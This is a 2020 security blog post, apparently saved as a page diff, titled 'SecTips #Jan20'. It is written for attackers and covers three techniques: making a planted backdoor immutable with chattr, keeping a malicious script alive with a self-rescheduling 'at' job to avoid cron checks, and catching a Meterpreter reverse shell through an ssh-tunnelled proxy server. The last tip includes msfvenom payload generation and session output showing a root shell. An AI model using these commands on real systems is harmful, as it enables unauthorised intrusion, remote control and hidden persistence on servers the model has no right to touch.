@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>SecTips #Jan20 :: Adam Jordan&#39;s Blog — Things I am interested in</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="About SecTips
+This is a series in which I will write some tips related to security engineering. Instead of discussing heavy and long topics, I will present some fun things in a concise walkthrough format.
+ Happy new year 2020! In this month&amp;rsquo;s SecTips, I will give some tips about how to create an unremovable file in UNIX, how to use AT for backdoor persistence, and how to listen to meterpreter with a laptop behind NAT."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://blog.adamjordan.id/posts/004-sectips-jan2020/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://blog.adamjordan.id/assets/style.css">
+
+
+<link rel="stylesheet" href="https://blog.adamjordan.id/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://blog.adamjordan.id/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://blog.adamjordan.id/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SecTips #Jan20"/>
+<meta name="twitter:description" content="Happy new year 2020! In this month&#39;s SecTips, I will give some tips about how to create an unremovable file in UNIX, how to use AT for backdoor persistence, and how to listen to meterpreter with a laptop behind NAT."/>
+
+
+
+<meta property="og:title" content="SecTips #Jan20" />
+<meta property="og:description" content="Happy new year 2020! In this month&#39;s SecTips, I will give some tips about how to create an unremovable file in UNIX, how to use AT for backdoor persistence, and how to listen to meterpreter with a laptop behind NAT." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.adamjordan.id/posts/004-sectips-jan2020/" />
+<meta property="article:published_time" content="2020-01-24T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-01-24T00:00:00+00:00" /><meta property="og:site_name" content="Adam Jordan&#39;s Blog" />
+
+
+
+
+
+
+  </head>
+  <body class="">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Jordan&#39;s Blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/security">Security</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/security">Security</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="https://blog.adamjordan.id/posts/004-sectips-jan2020/">SecTips #Jan20</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            24-01-2020
+        </span>
+      
+      <span class="post-author">— Written by Adam Jordan</span>
+      
+        <span class="post-read-time">— 3 min read</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://blog.adamjordan.id/tags/security/">security</a>&nbsp;
+        
+          #<a href="https://blog.adamjordan.id/tags/sectips/">sectips</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+
+<blockquote>
+<p><strong>About SecTips</strong></p>
+
+<p>This is a series in which I will write some tips related to security engineering.
+Instead of discussing heavy and long topics, I will present some <em>fun</em> things in a concise walkthrough format.</p>
+</blockquote>
+
+<p>Happy new year 2020! In this month&rsquo;s SecTips, I will give some tips about
+how to create an unremovable file in UNIX,
+how to use AT for backdoor persistence,
+and how to listen to meterpreter with a laptop behind NAT.</p>
+
+<ol>
+<li><a href="#tips1">Unremovable Files in UNIX</a></li>
+<li><a href="#tips2">Your Sysadmin knows CRON? Try using AT</a></li>
+<li><a href="#tips3">Listen to Meterpreter with your Laptop behind NAT</a></li>
+</ol>
+
+<h2 id="tips-01-unremovable-files-in-unix-a-name-tips1-a">TIPS-01: Unremovable Files in UNIX<a name="tips1"></a></h2>
+
+<p>Let&rsquo;s say you have put your super malicious backdoor in a server, and you did not want anyone to remove this backdoor file. How to do this? Just make it immutable in file-system level <em>:v</em></p>
+
+<pre><code class="language-bash">$ touch u-cant-rm-this
+
+$ ls -l
+total 0
+-rw-r--r-- 1 root root 0 Mar 14 09:39 u-cant-rm-this
+
+$ chattr +i u-cant-rm-this
+
+$ ls -l
+total 0
+-rw-r--r-- 1 root root 0 Mar 14 09:39 u-cant-rm-this
+
+$ rm u-cant-rm-this
+rm: cannot remove 'u-cant-rm-this': Operation not permitted
+</code></pre>
+
+<hr />
+
+<h2 id="tips-02-your-sysadmin-knows-cron-try-using-at-a-name-tips2-a">TIPS-02: Your Sysadmin knows CRON? Try using AT<a name="tips2"></a></h2>
+
+<p>You want to make your backdoor persistence? One of the easiest thing is to just add it to cron.
+However, let&rsquo;s face the truth: EVERYBODY knows cron!
+Of course it will be the first place to check by your sysadmin, and your malicious backdoor will be gone as easily as you put it on the cron.</p>
+
+<p>Try using <code>at</code>. Of course if someone knows it, it is also very easy to detect and remove,
+but I&rsquo;ll bet there are far fewer people that knows that the command even exists.</p>
+
+<pre><code class="language-bash">$ echo &quot;echo 1337 &gt; /tmp/meh&quot; &gt; malicious.sh
+
+$ at -f malicious.sh now + 1 minute
+warning: commands will be executed using /bin/sh
+Job 1 at Thu Mar 14 18:54:00 2019
+
+$ atq
+1 Thu Mar 14 18:54:00 2019 a user
+
+# wait...
+
+$ cat /tmp/meh
+1337
+</code></pre>
+
+<p>But it only run once! What to do if you want to run this periodically?</p>
+
+<p>Just add <code>at</code> command in your scripts&hellip;</p>
+
+<pre><code class="language-bash">$ echo &quot;at -f malicious.sh now + 1 minute&quot; &gt;&gt; malicious.sh
+$ at -f malicious.sh now + 1 minute
+</code></pre>
+
+<hr />
+
+<h2 id="tips-03-listen-to-meterpreter-with-your-laptop-behind-nat-a-name-tips3-a">TIPS-03: Listen to Meterpreter with your Laptop behind NAT<a name="tips3"></a></h2>
+
+<p>When you are targeting a server on the internet, sometimes you&rsquo;d like to listen to an incoming reverse shell session (via Meterpreter).
+In this case, you will need to setup the listener on a server with a public IP address.</p>
+
+<p>However, let&rsquo;s imagine a situation where we don&rsquo;t want to run metasploit on our servers, maybe to keep the server clean.
+What we want is to run the metasploit on our laptop, but <em>alas</em>, it did not have any front-facing public IP.</p>
+
+<p>In this tips, I will show how to use our server as proxy to forward the reverse shell session from our target to our laptop sitting behind NAT.</p>
+
+<pre><code class="language-bash"># setup ssh tunnel
+laptop:$ ssh -R 0.0.0.0:8080:127.0.0.1:1337 -NF user@proxy_server
+
+# listen for meterpreter connection
+laptop:$ msfconsole
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set LHOST 127.0.0.1
+msf5 exploit(multi/handler) &gt; set LPORT 1337
+msf5 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp
+msf5 exploit(multi/handler) &gt; exploit -j
+</code></pre>
+
+<p>Next let&rsquo;s generate payload and have our target execute it.</p>
+
+<pre><code class="language-bash"># generate payload
+laptop:$ msfvenom -p php/meterpreter_reverse_tcp \
+     LHOST=proxy_server \
+     LPORT=8080 &gt; payload
+
+# move payload to target server
+laptop:$ scp payload.php target:payload.php
+
+# execute payload in target server
+target:$ php payload.php
+</code></pre>
+
+<p>Then <em>boom</em>, the meterpreter is connected to your laptop.</p>
+
+<pre><code class="language-bash">msf5 exploit(multi/handler) &gt;
+[*] Meterpreter session 1 opened
+
+msf5 exploit(multi/handler) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter php/linux  root (0) @ f62342bbe4ce  127.0.0.1:1337 -&gt; 127.0.0.1:51306 (127.0.0.1)
+
+msf5 exploit(multi/handler) &gt; sessions 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; shell
+Process 121 created.
+
+whoami
+root
+</code></pre>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="https://blog.adamjordan.id/posts/003-case-study-on-jenkins-rce/">
+                  <span class="button__text">A Case Study on Jenkins RCE</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+    
+
+    
+      
+        
+    <br><br>
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "adam-blog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+      
+    
+    
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Jordan&#39;s Blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://blog.adamjordan.id/assets/main.js"></script>
+<script src="https://blog.adamjordan.id/assets/prism.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [['$','$'], ['\\(','\\)']],
+        displayMath: [['$$','$$'], ['\[','\]']],
+        processEscapes: true,
+        processEnvironments: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        TeX: { equationNumbers: { autoNumber: "AMS" },
+            extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    }
+});
+</script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124774114-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
